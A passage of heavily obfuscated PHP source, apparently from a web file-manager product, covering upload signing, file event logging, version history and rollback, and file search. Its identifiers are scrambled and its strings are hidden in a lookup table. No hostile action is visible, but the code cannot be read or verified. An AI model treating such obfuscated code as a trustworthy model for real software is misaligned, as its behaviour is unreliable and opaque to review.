$ÁÖ™¥Ï[266]; $®¬­³© = gmdate($ÁÖ™¥Ï[1344], time() + $Å¿°ˆ†); $¸ı·¬æ² = (string) time() . $ÁÖ™¥Ï[71] . (string) (time() + $Å¿°ˆ†); $ÉßÎ› = array($ÁÖ™¥Ï[267] => $®¬­³©, $ÁÖ™¥Ï[270] => array(array($ÁÖ™¥Ï[272] => $İÍÓ‘Ó), array($ÁÖ™¥Ï[271] => $this->bucket), array($ÁÖ™¥Ï[273], $ÁÖ™¥Ï[274], $ÁÖ™¥Ï[12]), array($ÁÖ™¥Ï[277] => $”£ƒ“ğ²), array($ÁÖ™¥Ï[1345] => $¡œõŠ¾), array($ÁÖ™¥Ï[1346] => $this->accessKey), array($ÁÖ™¥Ï[1347] => $¸ı·¬æ²))); $ÉßÎ› = json_encode($ÉßÎ›); $š¸Š•®€ = hash_hmac($ÁÖ™¥Ï[256], $¸ı·¬æ², $this->secret); $˜òÈÍÍİ = sha1($ÉßÎ›); $Ùí¥Û„Ü = hash_hmac($ÁÖ™¥Ï[256], $˜òÈÍÍİ, $š¸Š•®€); $Äµ‰§š± = array($ÁÖ™¥Ï[272] => $İÍÓ‘Ó, $ÁÖ™¥Ï[277] => $”£ƒ“ğ², $ÁÖ™¥Ï[285] => base64_encode($ÉßÎ›), $ÁÖ™¥Ï[1345] => $¡œõŠ¾, $ÁÖ™¥Ï[1346] => $this->accessKey, $ÁÖ™¥Ï[1348] => $¸ı·¬æ², $ÁÖ™¥Ï[1349] => $Ùí¥Û„Ü, $ÁÖ™¥Ï[196] => $this->getHost()); return $Äµ‰§š±; } public function fileOutLink($ŒéÀ–àÕ) { $ÁÅŸ´øò =& $_SERVER[–Ú¬çÁ]; if (substr($ŒéÀ–àÕ, 0, 7) == $ÁÅŸ´øò[1350]) { $ŒéÀ–àÕ = $ÁÅŸ´øò[1351] . substr($ŒéÀ–àÕ, 7); } header($ÁÅŸ´øò[162] . $ŒéÀ–àÕ); die; } } goto a¦ÙŞ¹Áò‡; cßØÚßï“ˆ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\x63\x65\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156"), array("\144\145\x73\143", '', "\x69\156\163\x65\x72\x74\x2c\x75\160\x64\x61\164\x65\54\163\x65\x6c\x65\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ø×Ò˜˜î, $ÔµÇ ×‚, $½¡é—õ« = '') { $×âéÎ‡ø =& $_SERVER[–Ú¬çÁ]; if (!$this->eventSave) { return; } $úÍ ®¤ = Model($×âéÎ‡ø[1352])->sourceInfo($Ø×Ò˜˜î); if (!$úÍ ®¤) { return !1; } if ($this->isCacheEvent($úÍ ®¤, $ÔµÇ ×‚)) { return; } if ($½¡é—õ« && is_string($½¡é—õ«)) { $½¡é—õ« = array($×âéÎ‡ø[1903] => $½¡é—õ«); } $±º•Ê¾¨ = defined($×âéÎ‡ø[2085]) ? USER_ID : 0; $¹Ë—‘ó” = array($×âéÎ‡ø[468] => $Ø×Ò˜˜î, $×âéÎ‡ø[2086] => $úÍ ®¤[$×âéÎ‡ø[180]], $×âéÎ‡ø[2087] => $úÍ ®¤[$×âéÎ‡ø[32]], $×âéÎ‡ø[561] => !empty($úÍ ®¤[$×âéÎ‡ø[561]]) ? $úÍ ®¤[$×âéÎ‡ø[561]] : $×âéÎ‡ø[12], $×âéÎ‡ø[1657] => $±º•Ê¾¨, $×âéÎ‡ø[473] => $ÔµÇ ×‚, $×âéÎ‡ø[1659] => $½¡é—õ«); $this->addSystemLog($ÔµÇ ×‚, $¹Ë—‘ó”); unset($¹Ë—‘ó”[$×âéÎ‡ø[2087]], $¹Ë—‘ó”[$×âéÎ‡ø[561]]); return $this->add($¹Ë—‘ó”); } private function addSystemLog($×ÑëÖ™Ã, $Ùõ¬µÚœ) { $úşËÅÇ¤ =& $_SERVER[–Ú¬çÁ]; if ($×ÑëÖ™Ã == $úşËÅÇ¤[2088]) { $×ÑëÖ™Ã = $Ùõ¬µÚœ[$úşËÅÇ¤[503]][$úşËÅÇ¤[2089]]; } else { if (in_array($×ÑëÖ™Ã, array($úşËÅÇ¤[1844], $úşËÅÇ¤[2090]))) { $×ÑëÖ™Ã = $Ùõ¬µÚœ[$úşËÅÇ¤[503]][$úşËÅÇ¤[774]]; } } $œş÷ñ = array_merge($Ùõ¬µÚœ, array($úşËÅÇ¤[2091] => $Ùõ¬µÚœ[$úşËÅÇ¤[181]], $úşËÅÇ¤[2092] => $Ùõ¬µÚœ[$úşËÅÇ¤[2092]])); Hook::trigger($úşËÅÇ¤[2093], $úşËÅÇ¤[2094] . $×ÑëÖ™Ã, $Ùõ¬µÚœ); Model($úşËÅÇ¤[1808])->addLog($úşËÅÇ¤[2094] . $×ÑëÖ™Ã, $œş÷ñ); } private function isCacheEvent($²ñšä‰Í, $¶òğ­¤„) { if ($²ñšä‰Í[$_SERVER[–Ú¬çÁ][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($©ËÅ÷¾, $Ó’îˆè) { $ä¹ã¼î‰ =& $_SERVER[–Ú¬çÁ]; $…ìá’‹ = Model($ä¹ã¼î‰[1352])->sourceInfo($©ËÅ÷¾); $§”ßÉ = array($ä¹ã¼î‰[2089] => $Ó’îˆè, $ä¹ã¼î‰[32] => $…ìá’‹[$ä¹ã¼î‰[32]]); return $this->addEvent($©ËÅ÷¾, $ä¹ã¼î‰[2088], $§”ßÉ); } public function eventFileEdit($¾˜íˆÑÚ) { $ó¬ø¨†á =& $_SERVER[–Ú¬çÁ]; $©ı²³²Ş = array($ó¬ø¨†á[2095] => $_SERVER[$ó¬ø¨†á[2096]], $ó¬ø¨†á[2097] => strtolower(ACTION)); if (isset($GLOBALS[$ó¬ø¨†á[7]][$ó¬ø¨†á[2098]])) { $©ı²³²Ş[$ó¬ø¨†á[2098]] = $ó¬ø¨†á[88]; } return $this->addEvent($¾˜íˆÑÚ, $ó¬ø¨†á[1834], $©ı²³²Ş); } public function eventRecycle($Ùâ‘«Àü, $“ºƒÃ‡Õ) { return $this->addEvent($Ùâ‘«Àü, $_SERVER[–Ú¬çÁ][2090], $“ºƒÃ‡Õ); } public function eventRemove($ª•£áâ¯) { $©á¶íÊ =& $_SERVER[–Ú¬çÁ]; $“¨Ò°ş« = Model($©á¶íÊ[1352])->sourceInfo($ª•£áâ¯); $ÎÃ¾ñÇ¾ = $“¨Ò°ş«[$©á¶íÊ[32]]; return $this->addEvent($“¨Ò°ş«[$©á¶íÊ[180]], $©á¶íÊ[1833], $ÎÃ¾ñÇ¾); } public function eventShare($º¡±£í£, $ëÊô®„œ) { return $this->addEvent($º¡±£í£, $_SERVER[–Ú¬çÁ][1844], $ëÊô®„œ); } public function eventMove($†­Áú²×, $Üò°Ú…, $¸–½ØÎ) { $²İÉºİÕ =& $_SERVER[–Ú¬çÁ]; $¦ªÚßß€ = Model($²İÉºİÕ[1352]); $ğ˜§˜ì¢ = $¦ªÚßß€->sourceInfo($†­Áú²×); $°’©¿Ä = $¦ªÚßß€->sourceInfo($Üò°Ú…); $²ğÅ”É = $¦ªÚßß€->sourceInfo($¸–½ØÎ); $àĞª‡øö = array($²İÉºİÕ[1180] => $Üò°Ú…, $²İÉºİÕ[2099] => $°’©¿Ä[$²İÉºİÕ[32]], $²İÉºİÕ[2076] => !empty($°’©¿Ä[$²İÉºİÕ[561]]) ? $°’©¿Ä[$²İÉºİÕ[561]] : $²İÉºİÕ[12], $²İÉºİÕ[1181] => $¸–½ØÎ, $²İÉºİÕ[2100] => $²ğÅ”É[$²İÉºİÕ[32]], $²İÉºİÕ[2101] => !empty($²ğÅ”É[$²İÉºİÕ[561]]) ? $²ğÅ”É[$²İÉºİÕ[561]] : $²İÉºİÕ[12]); $this->addEvent($†­Áú²×, $²İÉºİÕ[598], $àĞª‡øö); $ğ˜§˜ì¢ = $¦ªÚßß€->sourceInfo($†­Áú²×); $àĞª‡øö = array($²İÉºİÕ[181] => $ğ˜§˜ì¢[$²İÉºİÕ[181]], $²İÉºİÕ[32] => $ğ˜§˜ì¢[$²İÉºİÕ[32]]); $this->addEvent($Üò°Ú…, $²İÉºİÕ[2102], $àĞª‡øö); } public function eventCopy($î¯‰õ”ğ) { $this->eventCreate($î¯‰õ”ğ, $_SERVER[–Ú¬çÁ][596]); } public function eventRename($œ¤Òäş±, $¡¼·îğ‘, $¬õúâ„Š) { $«æœ˜êó =& $_SERVER[–Ú¬çÁ]; $‡¶óìÈ¸ = array($«æœ˜êó[1180] => $¡¼·îğ‘, $«æœ˜êó[1181] => $¬õúâ„Š); return $this->addEvent($œ¤Òäş±, $«æœ˜êó[1366], $‡¶óìÈ¸); } public function eventAddComment($©±ÖÀéº, $†åË¡º) { return $this->addEvent($©±ÖÀéº, $_SERVER[–Ú¬çÁ][2103], $†åË¡º); } public function eventAddDesc($şÄÉ®Ì•, $“ç¼ç) { return $this->addEvent($şÄÉ®Ì•, $_SERVER[–Ú¬çÁ][2104], $“ç¼ç); } public function listBySource($•²ËŸùó) { $Æ°æ›¹ =& $_SERVER[–Ú¬çÁ]; $¸ÚÒ«Æ« = Model($Æ°æ›¹[1352])->sourceInfo($•²ËŸùó); $¾­è³Ó¤ = array($Æ°æ›¹[468] => $•²ËŸùó); if ($¸ÚÒ«Æ«[$Æ°æ›¹[462]] == $Æ°æ›¹[88]) { $êÖŸöòÈ = Model($Æ°æ›¹[1352])->listSearchChildren($•²ËŸùó, 20000); $êÖŸöòÈ[] = $•²ËŸùó . $Æ°æ›¹[431]; $¾­è³Ó¤ = array($Æ°æ›¹[181] => array($Æ°æ›¹[7], $êÖŸöòÈ)); } $ÜüÍ÷âÀ = $this->where($¾­è³Ó¤)->order($Æ°æ›¹[2105])->selectPage(); if ($ÜüÍ÷âÀ[$Æ°æ›¹[419]][$Æ°æ›¹[420]] == 0) { $ÜüÍ÷âÀ[$Æ°æ›¹[419]][$Æ°æ›¹[420]] = 1; $ÜüÍ÷âÀ[$Æ°æ›¹[422]] = array(array($Æ°æ›¹[468] => $•²ËŸùó, $Æ°æ›¹[2086] => $¸ÚÒ«Æ«[$Æ°æ›¹[180]], $Æ°æ›¹[1657] => $¸ÚÒ«Æ«[$Æ°æ›¹[504]], $Æ°æ›¹[473] => $Æ°æ›¹[2106], $Æ°æ›¹[474] => $¸ÚÒ«Æ«[$Æ°æ›¹[225]], $Æ°æ›¹[1659] => $Æ°æ›¹[12])); } return $this->eventListParse($ÜüÍ÷âÀ, $•²ËŸùó); } private function eventListParse($İÈ­Ñ¦á, $ŞğÙ‡öÆ) { $œÇóÜÏ§ =& $_SERVER[–Ú¬çÁ]; $èĞÑÀœß = $İÈ­Ñ¦á[$œÇóÜÏ§[422]]; $¹â°¸£ = array_to_keyvalue($èĞÑÀœß, $œÇóÜÏ§[12], $œÇóÜÏ§[181]); $©”«ÅÊÈ = array_to_keyvalue($èĞÑÀœß, $œÇóÜÏ§[12], $œÇóÜÏ§[2092]); foreach ($èĞÑÀœß as $®Õ˜ ù) { $Ÿ€ß¦–Ğ = $®Õ˜ ù[$œÇóÜÏ§[503]]; if ($®Õ˜ ù[$œÇóÜÏ§[33]] == $œÇóÜÏ§[598] && isset($Ÿ€ß¦–Ğ[$œÇóÜÏ§[1180]])) { $¹â°¸£[] = $Ÿ€ß¦–Ğ[$œÇóÜÏ§[1180]] . $œÇóÜÏ§[12]; $¹â°¸£[] = $Ÿ€ß¦–Ğ[$œÇóÜÏ§[1181]] . $œÇóÜÏ§[12]; } if ($®Õ˜ ù[$œÇóÜÏ§[33]] == $œÇóÜÏ§[2102] && isset($Ÿ€ß¦–Ğ[$œÇóÜÏ§[181]])) { $¹â°¸£[] = $Ÿ€ß¦–Ğ[$œÇóÜÏ§[181]] . $œÇóÜÏ§[12]; } } $¹â°¸£ = array_merge($¹â°¸£, $©”«ÅÊÈ, array($ŞğÙ‡öÆ . $œÇóÜÏ§[12])); $¹â°¸£ = array_unique($¹â°¸£); $ä¥ô§¤² = array_unique(array_to_keyvalue($èĞÑÀœß, $œÇóÜÏ§[12], $œÇóÜÏ§[1666])); $ß“°èåé = Model($œÇóÜÏ§[577])->userListInfo($ä¥ô§¤²); $´»±øôÂ = Model($œÇóÜÏ§[845])->sourceListInfo($¹â°¸£, !0); foreach ($èĞÑÀœß as &$®Õ˜ ù) { if ($®Õ˜ ù[$œÇóÜÏ§[33]] == $œÇóÜÏ§[598] && isset($®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[1180]])) { $®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[1180]] = $´»±øôÂ[$®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[1180]]]; $®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[1181]] = $´»±øôÂ[$®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[1181]]]; } if ($®Õ˜ ù[$œÇóÜÏ§[33]] == $œÇóÜÏ§[2102] && isset($®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[181]])) { $®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[181]] = $´»±øôÂ[$®Õ˜ ù[$œÇóÜÏ§[503]][$œÇóÜÏ§[181]]]; } $®Õ˜ ù[$œÇóÜÏ§[87]] = $´»±øôÂ[$®Õ˜ ù[$œÇóÜÏ§[181]]]; $®Õ˜ ù[$œÇóÜÏ§[2107]] = $´»±øôÂ[$®Õ˜ ù[$œÇóÜÏ§[2092]]]; if ($®Õ˜ ù[$œÇóÜÏ§[33]] == $œÇóÜÏ§[1833]) { $®Õ˜ ù[$œÇóÜÏ§[2107]] = $®Õ˜ ù[$œÇóÜÏ§[87]]; $®Õ˜ ù[$œÇóÜÏ§[2092]] = $®Õ˜ ù[$œÇóÜÏ§[2107]][$œÇóÜÏ§[181]]; $®Õ˜ ù[$œÇóÜÏ§[87]] = !1; $®Õ˜ ù[$œÇóÜÏ§[181]] = $œÇóÜÏ§[12]; } $®Õ˜ ù[$œÇóÜÏ§[2036]] = $ß“°èåé[$®Õ˜ ù[$œÇóÜÏ§[1666]]]; } unset($®Õ˜ ù); $İÈ­Ñ¦á[$œÇóÜÏ§[422]] = $èĞÑÀœß; return $İÈ­Ñ¦á; } public function removeBySource($Ê‚–Æ”‡) { $à‰ÚÉÛ¦ = array($_SERVER[–Ú¬çÁ][468] => $Ê‚–Æ”‡); $this->where($à‰ÚÉÛ¦)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\143\145\137\x68\151\163\164\157\162\171"; public function historyCount($Æˆ²ùÔù) { $òÅ©É¦ =& $_SERVER[–Ú¬çÁ]; if (!$Æˆ²ùÔù) { return array(); } if (is_string($Æˆ²ùÔù) || is_int($Æˆ²ùÔù)) { $Æˆ²ùÔù = array($Æˆ²ùÔù); } $–Ò¼öÂ± = array($òÅ©É¦[181], $òÅ©É¦[1897] => $òÅ©É¦[543]); $€Ş²î… = array($òÅ©É¦[181] => array($òÅ©É¦[7], $Æˆ²ùÔù)); $«‰ÊÆÄ = $this->field($–Ò¼öÂ±)->where($€Ş²î…)->group($òÅ©É¦[181])->select(); return array_to_keyvalue($«‰ÊÆÄ, $òÅ©É¦[181], $òÅ©É¦[543]); } public function addHistory($™³ìóá», $ÂŞÖûÖı = '') { $áõÂúÆ¼ =& $_SERVER[–Ú¬çÁ]; $Ôú™¥Ğ = array($áõÂúÆ¼[468] => $™³ìóá»[$áõÂúÆ¼[181]], $áõÂúÆ¼[1657] => isset($™³ìóá»[$áõÂúÆ¼[506]]) ? $™³ìóá»[$áõÂúÆ¼[506]] : $™³ìóá»[$áõÂúÆ¼[504]], $áõÂúÆ¼[519] => $™³ìóá»[$áõÂúÆ¼[518]], $áõÂúÆ¼[595] => $™³ìóá»[$áõÂúÆ¼[76]], $áõÂúÆ¼[2108] => $ÂŞÖûÖı); if ($GLOBALS[$áõÂúÆ¼[6]][$áõÂúÆ¼[89]][$áõÂúÆ¼[1237]] >= 1) { $this->historyAutoClear($Ôú™¥Ğ[$áõÂúÆ¼[181]]); $this->add($Ôú™¥Ğ); } Hook::trigger($áõÂúÆ¼[2109], $Ôú™¥Ğ); Model($áõÂúÆ¼[2110])->eventFileEdit($™³ìóá»[$áõÂúÆ¼[181]]); } private function historyAutoClear($Ü¬Ïà‘) { $À£û„ÌŒ =& $_SERVER[–Ú¬çÁ]; $™Ô¿ˆ‘ = Model($À£û„ÌŒ[790])->get($À£û„ÌŒ[1259]); $–­…™Û = intval($GLOBALS[$À£û„ÌŒ[6]][$À£û„ÌŒ[89]][$À£û„ÌŒ[1237]]); $âÜÄŸ‡ = $™Ô¿ˆ‘ == $À£û„ÌŒ[1260] ? min(5, $–­…™Û) : $–­…™Û; $âÜÄŸ‡ = $âÜÄŸ‡ <= 0 ? 0 : $âÜÄŸ‡ - 1; if ($âÜÄŸ‡ >= 500) { return; } $íöó…¬Š = array($À£û„ÌŒ[468] => $Ü¬Ïà‘); $»í™‘ê“ = $this->field($À£û„ÌŒ[2111])->where($íöó…¬Š)->order($À£û„ÌŒ[2105])->select(); if (!$»í™‘ê“ || $âÜÄŸ‡ >= count($»í™‘ê“)) { return; } $Ï”æšªø = array_to_keyvalue($»í™‘ê“, $À£û„ÌŒ[12], $À£û„ÌŒ[452]); $Ï”æšªø = array_slice($Ï”æšªø, $âÜÄŸ‡); $ûÔ™¥Õ = array_to_keyvalue($»í™‘ê“, $À£û„ÌŒ[12], $À£û„ÌŒ[518]); $ûÔ™¥Õ = array_slice($ûÔ™¥Õ, $âÜÄŸ‡); if (!$Ï”æšªø || !$ûÔ™¥Õ) { return; } $íöó…¬Š = array($À£û„ÌŒ[470] => array($À£û„ÌŒ[7], $Ï”æšªø)); $this->where($íöó…¬Š)->delete(); Model($À£û„ÌŒ[521])->remove($ûÔ™¥Õ); } public function listData($…‡ŒºÖ¹) { $©å÷Û¾ =& $_SERVER[–Ú¬çÁ]; $»‹ñ²Ë = array($©å÷Û¾[468] => $…‡ŒºÖ¹); $î¹è¯÷ = $©å÷Û¾[2112]; $ÌÛ†ØÄÑ = $this->field($î¹è¯÷)->where($»‹ñ²Ë)->order($©å÷Û¾[2105])->selectPage(); $this->_listAppendUser($ÌÛ†ØÄÑ[$©å÷Û¾[422]]); $ÓŸ‡µ§¨ = Model($©å÷Û¾[790])->get($©å÷Û¾[1259]); $Êğ ğî¶ = 5; if ($ÓŸ‡µ§¨ == $©å÷Û¾[1260]) { $ÌÛ†ØÄÑ[$©å÷Û¾[422]] = array_slice($ÌÛ†ØÄÑ[$©å÷Û¾[422]], 0, $Êğ ğî¶); $ÌÛ†ØÄÑ[$©å÷Û¾[419]] = array($©å÷Û¾[2113] => 1, $©å÷Û¾[2114] => 20, $©å÷Û¾[2115] => 1, $©å÷Û¾[2116] => count($ÌÛ†ØÄÑ[$©å÷Û¾[422]])); } return $ÌÛ†ØÄÑ; } protected function _listAppendUser(&$í«—ˆ˜Ë) { $Æö÷Û =& $_SERVER[–Ú¬çÁ]; $äÃËû¸ï = array_to_keyvalue($í«—ˆ˜Ë, $Æö÷Û[12], $Æö÷Û[1666]); $ÔâİÄ¸Á = Model($Æö÷Û[577])->userListInfo($äÃËû¸ï); foreach ($í«—ˆ˜Ë as &$ºêÀÏŠ¥) { $¦µ¦¦¾é = $ºêÀÏŠ¥[$Æö÷Û[1666]]; $ºêÀÏŠ¥[$Æö÷Û[504]] = $ÔâİÄ¸Á[$¦µ¦¦¾é] ? $ÔâİÄ¸Á[$¦µ¦¦¾é] : !1; } unset($ºêÀÏŠ¥); } public function fileInfo($†Ç…ë¦ï) { $ÑËª¥òú =& $_SERVER[–Ú¬çÁ]; $±À€âÅ = $this->tablePrefix; $î‘ÃìÈÂ = "{$±À€âÅ}\151\x6f\x5f\x66\x69\154\145\40\146\x69\x6c\145\x73\40\x6f\x6e\x20\x66\151\154\x65\163\x2e\x66\x69\x6c\x65\x49\104\40\75\40\x68\151\163\164\157\x72\171\x2e\x66\x69\154\x65\x49\x44"; return $this->alias($ÑËª¥òú[2117])->where(array($ÑËª¥òú[470] => $†Ç…ë¦ï))->join($î‘ÃìÈÂ, $ÑËª¥òú[2118])->find(); } public function removeItem($¸¹¤Ôœ) { $ä¥Ê“õÃ =& $_SERVER[–Ú¬çÁ]; $‰ãßü™« = array($ä¥Ê“õÃ[470] => $¸¹¤Ôœ); $Û“¨¿¿š = $this->where($‰ãßü™«)->find(); if ($Û“¨¿¿š) { $â‰ÖŒéİ = $this->where($‰ãßü™«)->delete(); Model($ä¥Ê“õÃ[521])->remove($Û“¨¿¿š[$ä¥Ê“õÃ[518]]); return $â‰ÖŒéİ; } return !1; } public function removeBySource($Á–Ù¯¼) { $’Ë«ŞğŠ =& $_SERVER[–Ú¬çÁ]; if (!$Á–Ù¯¼) { return !1; } if (!is_array($Á–Ù¯¼)) { $Á–Ù¯¼ = array($Á–Ù¯¼); } $ËÇˆ•ŒŠ = array($’Ë«ŞğŠ[468] => array($’Ë«ŞğŠ[7], $Á–Ù¯¼)); $Œ¸áÑ¿¡ = $this->field($’Ë«ŞğŠ[519])->where($ËÇˆ•ŒŠ)->select(); if ($Œ¸áÑ¿¡) { $this->where($ËÇˆ•ŒŠ)->delete(); $Ñ¾à”şì = array_to_keyvalue($Œ¸áÑ¿¡, $’Ë«ŞğŠ[12], $’Ë«ŞğŠ[518]); Model($’Ë«ŞğŠ[521])->remove($Ñ¾à”şì); } return !0; } public function setDetail($…É¾¤ö‘, $õÈåĞâ™) { $ò³¬¨« =& $_SERVER[–Ú¬çÁ]; return $this->where(array($ò³¬¨«[470] => $…É¾¤ö‘))->save(array($ò³¬¨«[2108] => $õÈåĞâ™)); } public function rollbackToItem($è„Öıƒ¥, $¼«ïÂû“) { $Ú­™şë =& $_SERVER[–Ú¬çÁ]; $¤è¬ïè— = Model($Ú­™şë[845])->sourceInfo($è„Öıƒ¥); $this->addHistory($¤è¬ïè—, LNG($Ú­™şë[2119])); $µìÃÚêÖ = $this->find($¼«ïÂû“); $ Ñ—·ê» = array($Ú­™şë[518] => $µìÃÚêÖ[$Ú­™şë[518]], $Ú­™şë[76] => $µìÃÚêÖ[$Ú­™şë[76]], $Ú­™şë[85] => time(), $Ú­™şë[506] => USER_ID); Model($Ú­™şë[845])->where(array($Ú­™şë[181] => $è„Öıƒ¥))->save($ Ñ—·ê»); return $this->where(array($Ú­™şë[470] => $¼«ïÂû“))->delete(); } public function clearSame($ÂÎÊí¢Û) { $ÎÚöÉ =& $_SERVER[–Ú¬çÁ]; $Ş”¥Éº = $this->listData($ÂÎÊí¢Û); $ú—ğ·ï = array_to_keyvalue_group($Ş”¥Éº, $ÎÚöÉ[518]); $ÅĞ¡¸€ = array(); $âó«æİÉ = array(); foreach ($ú—ğ·ï as $—ÊÛâ”) { if (!$—ÊÛâ” || count($—ÊÛâ”) <= 1) { continue; } foreach ($—ÊÛâ” as $ ­İö÷ş) { $ÅĞ¡¸€[] = $ ­İö÷ş[$ÎÚöÉ[518]]; $âó«æİÉ[] = $ ­İö÷ş[$ÎÚöÉ[452]]; } } if (!$âó«æİÉ) { return; } $this->where(array($ÎÚöÉ[452] => array($ÎÚöÉ[7], $âó«æİÉ)))->delete(); Model($ÎÚöÉ[521])->remove($ÅĞ¡¸€); } public function userSpace() { $Ø¿ÉÉî =& $_SERVER[–Ú¬çÁ]; $’°¿Áá† = $this->tablePrefix; $ÙşÀÁŞĞ = array($Ø¿ÉÉî[1657] => USER_ID); $ŒõÃœºÆ = "{$’°¿Áá†}\151\x6f\x5f\146\x69\154\x65\x20\146\151\x6c\145\x73\40\157\156\40\146\x69\154\145\163\56\146\x69\154\145\111\104\40\75\x20\x68\x69\x73\164\x6f\162\x79\x2e\x66\151\154\x65\111\104"; return $this->alias($Ø¿ÉÉî[2117])->where($ÙşÀÁŞĞ)->join($ŒõÃœºÆ, $Ø¿ÉÉî[2118])->sum($Ø¿ÉÉî[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($× İÊÉŞ) { $„‰ãÅÆ‚ =& $_SERVER[–Ú¬çÁ]; $à¿çÒ Ä = KodIO::fileTypeList(); $øÊÑìÆ¡ = $à¿çÒ Ä[$× İÊÉŞ]; if (!$øÊÑìÆ¡) { return array(); } $„§®ì = $øÊÑìÆ¡[$„‰ãÅÆ‚[175]]; $ıôâ î = $„‰ãÅÆ‚[7]; if (!$øÊÑìÆ¡[$„‰ãÅÆ‚[175]]) { $€ëÁ´í = array_to_keyvalue($à¿çÒ Ä, $„‰ãÅÆ‚[12], $„‰ãÅÆ‚[175]); $„§®ì = implode($„‰ãÅÆ‚[50], $€ëÁ´í); $ıôâ î = $„‰ãÅÆ‚[2120]; } $¬™ñüÈâ = explode($„‰ãÅÆ‚[50], trim($„§®ì, $„‰ãÅÆ‚[50])); return array($ıôâ î, $¬™ñüÈâ); } public function listPathType($˜Ä‡¬–É) { $íÕ“„‡ =& $_SERVER[–Ú¬çÁ]; $²¼„î…ü = $this->fileTypeWhere($˜Ä‡¬–É); if (!$²¼„î…ü) { return array(); } $ò èú‹Õ = USER_ID; $öŸÛÉÉ = Model($íÕ“„‡[577])->getInfo($ò èú‹Õ); $Š¶—æµË = array($íÕ“„‡[626] => SourceModel::TYPE_USER, $íÕ“„‡[563] => array($íÕ“„‡[590], $íÕ“„‡[573] . $öŸÛÉÉ[$íÕ“„‡[87]][$íÕ“„‡[181]] . $íÕ“„‡[591]), $íÕ“„‡[627] => $ò èú‹Õ, $íÕ“„‡[624] => 0, $íÕ“„‡[625] => $²¼„î…ü); return $this->listSource($Š¶—æµË); } public function listSearch($Ã¸¼‹íµ, $³ïÒ¸ï´ = 300) { $˜Àıñ§² =& $_SERVER[–Ú¬çÁ]; if (isset($Ã¸¼‹íµ[$˜Àıñ§²[1958]]) && $Ã¸¼‹íµ[$˜Àıñ§²[1958]]) { $Ã¸¼‹íµ[$˜Àıñ§²[1958]] = str_replace($˜Àıñ§²[437], $˜Àıñ§²[2121], trim($Ã¸¼‹íµ[$˜Àıñ§²[1958]])); } $‘ÊšşÙï = $this->_parseSearchWhere($Ã¸¼‹íµ); if (!isset($‘ÊšşÙï[$˜Àıñ§²[482]])) { $‘ÊšşÙï[$˜Àıñ§²[482]] = 0; } $îÓ±Çï = $˜Àıñ§²[2122]; $ª“Õ¶£­ = $‘ÊšşÙï; $ØôçÁÓ× = $îÓ±Çï; $this->_listSearchBindPinyin($Ã¸¼‹íµ, $‘ÊšşÙï, $îÓ±Çï); $this->alias($˜Àıñ§²[496])->_makeOrder(); $‘ÊšşÙï = $this->parseWhereLike($‘ÊšşÙï); $‰Í¶´ââ = $this->distinct(!0)->field($îÓ±Çï)->where($‘ÊšşÙï)->selectPage($³ïÒ¸ï´); if ($GLOBALS[$˜Àıñ§²[6]][$˜Àıñ§²[434]][$˜Àıñ§²[435]] && Input::check($Ã¸¼‹íµ[$˜Àıñ§²[1958]], $˜Àıñ§²[633]) && $‰Í¶´ââ[$˜Àıñ§²[419]][$˜Àıñ§²[406]] == 1 && $‰Í¶´ââ[$˜Àıñ§²[419]][$˜Àıñ§²[420]] == 0) { $‰Í¶´ââ = $this->distinct(!0)->field($îÓ±Çï)->where($ª“Õ¶£­)->limit(1000)->select(); $‰Í¶´ââ = array_page_split($‰Í¶´ââ, !1, $³ïÒ¸ï´); } $this->_listSearchFileContent($‰Í¶´ââ, $Ã¸¼‹íµ, $ØôçÁÓ×, $ª“Õ¶£­); $this->_listSearchDesc($‰Í¶´ââ, $Ã¸¼‹íµ, $ØôçÁÓ×); $this->_listSearchTag($‰Í¶´ââ, $Ã¸¼‹íµ, $ØôçÁÓ×); $this->_listSearchGroupTag($‰Í¶´ââ, $Ã¸¼‹íµ, $ØôçÁÓ×); $this->_listDataApply($‰Í¶´ââ[$˜Àıñ§²[422]]); $this->_listMake($‰Í¶´ââ); return $‰Í¶´ââ; } private function _listSearchFileContent(&$›ŞÏïäò, $‡¶»è›Ä, $èƒŸ¶¦ş, $ï¤‚åƒª) { $—¶ï‡ø =& $_SERVER[–Ú¬çÁ]; if (!$‡¶»è›Ä[$—¶ï‡ø[1958]] || $›ŞÏïäò[$—¶ï‡ø[419]][$—¶ï‡ø[406]] > 1) { return; } if (!isset($ï¤‚åƒª[$—¶ï‡ø[32]]) || !is_array($‡¶»è›Ä[$—¶ï‡ø[518]])) { return; } $ï¤‚åƒª[$—¶ï‡ø[518]] = array($—¶ï‡ø[7], $‡¶»è›Ä[$—¶ï‡ø[518]]); unset($ï¤‚åƒª[$—¶ï‡ø[32]]); unset($‡¶»è›Ä[$—¶ï‡ø[518]]); $òÀµĞÂ = $this->field($èƒŸ¶¦ş)->where($ï¤‚åƒª)->limit($—¶ï‡ø[2123])->select(); if (!$òÀµĞÂ || count($òÀµĞÂ) == 0) { return; } $›ŞÏïäò[$—¶ï‡ø[422]] = array_merge($òÀµĞÂ, $›ŞÏïäò[$—¶ï‡ø[422]]); $›ŞÏïäò[$—¶ï‡ø[419]][$—¶ï‡ø[420]] += count($òÀµĞÂ); } private function _listSearchTag(&$”çèûŠÓ, $‚‡ñöËô, $­¿ê ¬‹) { $„ÔÀòÁ˜ =& $_SERVER[–Ú¬çÁ]; if (!$‚‡ñöËô[$„ÔÀòÁ˜[1958]] || 